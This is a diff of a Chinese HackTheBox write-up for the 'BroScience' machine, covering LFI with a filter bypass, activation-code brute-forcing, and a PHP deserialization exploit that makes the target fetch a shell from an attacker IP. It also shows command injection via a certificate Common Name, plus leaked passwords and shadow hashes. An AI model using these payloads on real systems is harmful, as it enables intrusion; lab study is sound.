@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;521  10.10.11.195   端口扫描22,80,443: 12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.11.195Starting Nmap 7.93 ( https:">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;521  10.10.11.195                                                                                                              端口扫描22,80,443: 1234">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BroScience - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/01/09/BroScience-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;521  10.10.11.195   端口扫描22,80,443: 12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.11.195Starting Nmap 7.93 ( https:">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;521  10.10.11.195                                                                                                              端口扫描22,80,443: 1234">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010901.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010902.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010903.jpg">
@@ -135,7 +135,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -225,7 +225,14 @@
 </li>
 <li><h2 id="10-10-11-195"><a href="#10-10-11-195" class="headerlink" title="10.10.11.195"></a>10.10.11.195</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010901.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010901.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,443:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.195</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 14:40 CST</span><br><span class="line">Nmap scan report for 10.10.11.195</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)</span><br><span class="line">|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)</span><br><span class="line">|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.54</span><br><span class="line">|_http-title: Did not follow redirect to https://broscience.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.54 (Debian)</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT</span><br><span class="line">| Not valid before: 2022-07-14T19:48:36</span><br><span class="line">|_Not valid after:  2023-07-14T19:48:36</span><br><span class="line">|_http-server-header: Apache/2.4.54 (Debian)</span><br><span class="line">|_http-title: BroScience : Home</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 73.45 seconds</span><br></pre></td></tr></table></figure>
 
@@ -235,45 +242,145 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.195 broscience.htb</span><br></pre></td></tr></table></figure>
 
 <p>健身相关的：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010902.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010902.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>扫描发现includes，进一步发现img.php:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u https://broscience.htb/ -k -x php,html,txt</span><br><span class="line"></span><br><span class="line">/activate.php         (Status: 200) [Size: 1256]</span><br><span class="line">/comment.php          (Status: 302) [Size: 13] [--&gt; /login.php]</span><br><span class="line">/images               (Status: 301) [Size: 319] [--&gt; https://broscience.htb/images/]</span><br><span class="line">/includes             (Status: 301) [Size: 321] [--&gt; https://broscience.htb/includes/]</span><br><span class="line">/index.php            (Status: 200) [Size: 9308]</span><br><span class="line">/javascript           (Status: 301) [Size: 323] [--&gt; https://broscience.htb/javascript/]</span><br><span class="line">/login.php            (Status: 200) [Size: 1936]</span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; /index.php]</span><br><span class="line">/manual               (Status: 301) [Size: 319] [--&gt; https://broscience.htb/manual/]</span><br><span class="line">/register.php         (Status: 200) [Size: 2161]</span><br><span class="line">/styles               (Status: 301) [Size: 319] [--&gt; https://broscience.htb/styles/]</span><br><span class="line">/user.php             (Status: 200) [Size: 1309]</span><br><span class="line"></span><br><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u https://broscience.htb/includes/ -k -x php,html,txt</span><br><span class="line"></span><br><span class="line">/db_connect.php       (Status: 200) [Size: 0]</span><br><span class="line">/header.php           (Status: 200) [Size: 369]</span><br><span class="line">/img.php              (Status: 200) [Size: 39]</span><br><span class="line">/utils.php            (Status: 200) [Size: 0]</span><br></pre></td></tr></table></figure>
 
 <h2 id="img-php"><a href="#img-php" class="headerlink" title="img.php"></a>img.php</h2><p>直接访问提示缺少path参数：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010903.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010903.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>根据path参数，很容易想到LFI，但存在检测：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010904.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010904.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>简单地绕过，两次URL编码即可：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010905.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010905.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>后面就是LFI读文件：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$db_host = <span class="string">"localhost"</span>;</span><br><span class="line">$db_port = <span class="string">"5432"</span>;</span><br><span class="line">$db_name = <span class="string">"broscience"</span>;</span><br><span class="line">$db_user = <span class="string">"dbuser"</span>;</span><br><span class="line">$db_pass = <span class="string">"RangeOfMotion%777"</span>;</span><br><span class="line">$db_salt = <span class="string">"NaCl"</span>;</span><br><span class="line"></span><br><span class="line">$activation_link = <span class="string">"https://broscience.htb/activate.php?code=&#123;$activation_code&#125;"</span>;</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="db-connect-php"><a href="#db-connect-php" class="headerlink" title="db_connect.php"></a>db_connect.php</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010906.jpg" alt=""></p>
+<h2 id="db-connect-php"><a href="#db-connect-php" class="headerlink" title="db_connect.php"></a>db_connect.php</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010906.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h2><p>代码显示发送激活链接功能还没做：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010907.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010907.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="utils-php"><a href="#utils-php" class="headerlink" title="utils.php"></a>utils.php</h2><p>根据代码，生成激活码的随机数种子和时间相关：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010908.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010908.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h1><p>所以我们可以自己根据时间生成激活码，一般前后500ms范围内时间作为种子即可</p>
 <p>首先注册一个账号，得到服务端的响应时间：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010909.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010909.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>然后根据时间作为随机数种子爆破出有效激活码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php activate.php &gt; codes.txt</span><br><span class="line"></span><br><span class="line">ffuf -w ./codes.txt:FUZZ -u "https://broscience.htb/activate.php?code=FUZZ"  -fs 125</span><br><span class="line"></span><br><span class="line">qdJkKQPQa5JeVIzP9JM1PFe3vRGFa3cO [Status: 200, Size: 1251, Words: 292, Lines: 28, Duration: 689ms]</span><br></pre></td></tr></table></figure>
 
 <p>现在，我们注册的账号已经激活，可以登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010910.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010910.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="activate-php"><a href="#activate-php" class="headerlink" title="activate.php"></a>activate.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span><span class="params">($time)</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span>;</span><br><span class="line">    srand($time);</span><br><span class="line">    $activation_code = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">32</span>; $i++) &#123;</span><br><span class="line">        $activation_code = $activation_code . $chars[rand(<span class="number">0</span>, </span><br><span class="line">strlen($chars) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $activation_code;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// find this from the above server response time</span></span><br><span class="line">$ref_time = date(<span class="string">"U"</span>,strtotime(<span class="string">'Mon, 09 Jan 2023 07:08:32 GMT'</span>));</span><br><span class="line"><span class="keyword">for</span> ($t = $ref_time - <span class="number">500</span>; $t &lt;= $ref_time + <span class="number">500</span>; $t++)</span><br><span class="line">    <span class="keyword">echo</span> generate_activation_code($t).<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h1><p>查看cookie发现是序列化数据，根据前面utils中的代码存在反序列化操作：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010911.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010912.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010911.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010912.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="反序列化-getshell"><a href="#反序列化-getshell" class="headerlink" title="反序列化 getshell"></a>反序列化 getshell</h2><p>根据代码，<code>get_theme</code>读取 cookie 并反序列化它，<code>Avatar</code>读取文件并保存到本地。因此，我们可以利用这些让目标从我们这里读取 shell 脚本，然后触发目标上的 shell。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php exploit.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010913.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010914.jpg" alt=""></p>
-<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010915.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010913.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010914.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010915.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="exploit-php"><a href="#exploit-php" class="headerlink" title="exploit.php"></a>exploit.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $imgPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($imgPath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;imgPath = $imgPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($tmp)</span> </span>&#123;</span><br><span class="line">        $f = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">"w"</span>);</span><br><span class="line">        fwrite($f, file_get_contents($tmp));</span><br><span class="line">        fclose($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $tmp = <span class="string">"http://10.10.14.19:7777/shell.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $imgPath = <span class="string">"./shell.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $a = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line">        $a-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> AvatarInterface));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>前面已经得到有数据库密码，查看数据库得到hash：</p>
@@ -285,7 +392,14 @@
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>bill用户ssh登录，得到user flag：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bill ： iluvhorsesandgym</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010916.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010916.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>运行pspy64，发现一个/opt/renew_cert.sh定期以root权限运行：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt</span><br></pre></td></tr></table></figure>
 
@@ -295,7 +409,14 @@
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>生成一个证书，注入命令，等待触发执行：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd Certs/</span><br><span class="line">openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Common Name</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(chmod +s /usr/bin/bash)</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010917.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023010917.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$CRyECZOR16PKCYvfMPEU1&#x2F;$&#x2F;&#x2F;xk7MP6mTa0jQvj4rq.H7w8DTBROI3SW9NfWncuoM2:19185:0:99999:7:::</span><br><span class="line">bill:$y$j9T$0VHousYX7xxJh3Ih0AzAQ&#x2F;$JO8mxhyALh1nWEVKM9qf675XnEb26Q15SLPakaMchH3:19187:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
